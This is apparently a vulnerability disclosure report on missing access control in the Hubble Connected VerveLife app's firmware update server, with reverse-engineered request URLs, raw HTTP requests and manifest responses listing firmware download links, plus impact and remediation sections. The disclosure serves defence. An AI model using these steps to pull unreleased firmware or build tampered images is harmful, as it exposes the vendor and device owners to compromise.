# Vulnerability Report - com.hubbleconnected.vervelife- Incorrect Access Control

**Product:** `com.hubbleconnected.vervelife` 

**Vendor:** [Hubble Connected](https://hubbleconnected.com/)

**Version:** 2.00.81

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `com.hubbleconnected.vervelife` , developed by **Hubble Connected**, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTPS requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage**.

## Reproduction Steps

1. The `getOTAUrl` method's return value in the `DrakePlusProduct` class provides the necessary URL and other information required for the HTTPS request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   ![image-20241003205935720](https://s2.loli.net/2024/10/03/b3ZGTvMKeHmFyEV.png)

2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```http
   GET https://ota.hubble.in/verve/verve_manifest.json HTTP/1.1
   User-Agent: Fiddler Everywhere
   Host: ota.hubble.in
   Content-Length: 0
   Content-Type: text/plain
   
   ```

   ```
   GET https://ota.hubble.in/verve/verve_manifest_plus.json HTTP/1.1
   User-Agent: Fiddler Everywhere
   Host: ota.hubble.in
   Content-Length: 0
   Content-Type: text/plain
   ```

   

   > Response:

   ```http
   HTTP/1.1 200 OK
   Date: Thu, 03 Oct 2024 12:57:18 GMT
   Content-Type: application/json
   Content-Length: 2141
   Connection: keep-alive
   Server: nginx/1.12.1
   Last-Modified: Thu, 18 Aug 2016 05:50:16 GMT
   ETag: "57b54c98-85d"
   Accept-Ranges: bytes
   
   {
       "product": {
           "name": "VerveOnes",
           "package": [
               {
                   "name": "NA",
                   "supported_languages": [
                       "enUS",
                       "frCA",
                       "esES",
                       "enGB",
                       "frFR",
                       "deDE",
                       "itIT"
                   ],
                   "objects": [
                       {
                           "file": "drake_headset_code_rel_v00.43.img",
                           "type": 1,
                           "version": "00.43",
   						"url": "https://ota.hubble.in/verve/v0.43/drake_headset_code_rel_v00.43.img",
                           "md5": "0512a8c15f34946eda55c850c4e3b173"
                       },
                       {
                           "file": "drake_headset_image_rel_na_v00.02.img",
                           "type": 2,
                           "version": "00.02",
   						"url": "https://ota.hubble.in/verve/v0.43/drake_headset_image_rel_na_v00.02.img",
                           "md5": "7ab4fd61e1342fe02b018df213a1e9af"
                       }
                   ]
               },
               {
                   "name": "RW",
                   "supported_languages": [
                       "enGB",
                       "zhCN",
                       "jaJP"
                   ],
                   "objects": [
                       {
                           "file": "drake_headset_code_rel_v00.43.img",
                           "type": 1,
                           "version": "00.43",
   						"url": "https://ota.hubble.in/verve/v0.43/drake_headset_code_rel_v00.43.img",
                           "md5": "0512a8c15f34946eda55c850c4e3b173"
                       },
                       {
                           "file": "drake_headset_image_rel_rw_v00.02.img",
                           "type": 2,
                           "version": "00.02",
   						"url": "https://ota.hubble.in/verve/v0.43/drake_headset_image_rel_rw_v00.02.img",
                           "md5": "e893c1508aea2b7686eed792b202cdd8"
                       }
                   ]
               }
           ]
       }
   }
   
   ```

   ```http
   HTTP/1.1 200 OK
   Date: Thu, 03 Oct 2024 12:57:46 GMT
   Content-Type: application/json
   Content-Length: 2176
   Connection: keep-alive
   Server: nginx/1.12.1
   Last-Modified: Thu, 18 Aug 2016 05:50:25 GMT
   ETag: "57b54ca1-880"
   Accept-Ranges: bytes
   
   {
       "product": {
           "name": "VerveOnes+",
           "package": [
               {
                   "name": "NA",
                   "supported_languages": [
                       "enUS",
                       "frCA",
                       "esES",
                       "enGB",
                       "frFR",
                       "deDE",
                       "itIT"
                   ],
                   "objects": [
                       {
                           "file": "drake_headset_code_rel_v00.43_plus.img",
                           "type": 1,
                           "version": "00.43",
   						"url": "https://ota.hubble.in/verve/v0.43plus/drake_headset_code_rel_v00.43_plus.img",
                           "md5": "f96d11e0a7c1681b3529ce8a0aa9ec07"
                       },
                       {
                           "file": "drake_headset_image_rel_na_v00.02.img",
                           "type": 2,
                           "version": "00.02",
   						"url": "https://ota.hubble.in/verve/v0.43plus/drake_headset_image_rel_na_v00.02.img",
                           "md5": "7ab4fd61e1342fe02b018df213a1e9af"
                       }
                   ]
               },
               {
                   "name": "RW",
                   "supported_languages": [
                       "enGB",
                       "zhCN",
                       "jaJP"
                   ],
                   "objects": [
                       {
                           "file": "drake_headset_code_rel_v00.43_plus.img",
                           "type": 1,
                           "version": "00.43",
   						"url": "https://ota.hubble.in/verve/v0.43plus/drake_headset_code_rel_v00.43_plus.img",
                           "md5": "f96d11e0a7c1681b3529ce8a0aa9ec07"
                       },
                       {
                           "file": "drake_headset_image_rel_rw_v00.02.img",
                           "type": 2,
                           "version": "00.02",
   						"url": "https://ota.hubble.in/verve/v0.43plus/drake_headset_image_rel_rw_v00.02.img",
                           "md5": "e893c1508aea2b7686eed792b202cdd8"
                       }
                   ]
               }
           ]
       }
   }
   ```

3. Consequently, the unprotected firmware can be directly downloaded using this information.

   ![image-20241003211449247](https://s2.loli.net/2024/10/03/SLBO4mqsT5xJeIH.png)

   In total, we successfully downloaded **4 firmware** by exploiting the vulnerability.


## Impact

An attacker can exploit this vulnerability to:

* Download the latest firmware before it is officially released.
* Analyze the firmware for vulnerabilities or proprietary information.
* Create modified firmware images with malicious code.
* Distribute compromised firmware updates to unsuspecting users.

## Remediation

* Implement proper access control on the firmware server, such as device ID and user ID verification.
* Enhance the app's firmware update mechanism to include authentication credentials in the requests.


## Disclaimer

This vulnerability report is provided for informational purposes only and should not be used for any malicious activities. The author is not responsible for any misuse of the information contained herein.